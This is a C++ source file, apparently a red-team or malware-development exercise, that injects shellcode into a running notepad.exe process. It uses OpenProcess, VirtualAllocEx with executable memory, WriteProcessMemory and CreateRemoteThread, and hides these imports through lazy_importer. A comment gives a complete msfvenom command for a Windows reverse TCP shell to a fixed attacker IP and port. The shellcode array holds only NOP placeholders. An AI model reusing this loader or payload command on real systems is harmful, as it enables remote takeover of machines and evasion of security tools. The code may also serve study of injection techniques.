#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <windows.h>
#include <tlhelp32.h>
#include "lazy_importer.h"

DWORD EncryptShellcode(char * shellcode) {
	return 0;
}

DWORD MyGetProcessId(LPCTSTR ProcessName) // non-conflicting function name
{
	PROCESSENTRY32 pt;
	HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pt.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hsnap, &pt)) { // must call this first
		do {
			if (!lstrcmpi(pt.szExeFile, ProcessName)) {
				CloseHandle(hsnap);
				return pt.th32ProcessID;
			}
		} while (Process32Next(hsnap, &pt));
	}
	CloseHandle(hsnap); // close handle on failure
	return 0;
}


int main(int argc, char* argv[])
{
	
	DWORD pid = MyGetProcessId(TEXT("notepad.exe"));
	std::cout << "Printing PID with string formatter" << pid << std::endl;
	if (pid == 0) { printf("error 1"); getchar(); }//error

	// msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.18.229.201 LPORT=1234 -f c -b '\x00\x0a\x0d\x20'
	unsigned char shellcode[] = "\x90\x90\x90\x90";
	SIZE_T shellcodeSize = sizeof(shellcode);

	HANDLE hProcess;
	hProcess = LI_FN(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, pid);

	PVOID baseAddress;
	baseAddress = LI_FN(VirtualAllocEx)(hProcess, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	printf("%-20s : 0x%-016p\n", "payload addr", (void*)shellcode);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)baseAddress);
	printf("\nPause Program!\n");
	getchar();


	LI_FN(WriteProcessMemory)(hProcess, baseAddress, shellcode, shellcodeSize, nullptr);

	HANDLE hThread;
	hThread = LI_FN(CreateRemoteThread)(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)baseAddress, nullptr, 0, nullptr);

	LI_FN(CloseHandle)(hProcess);

}
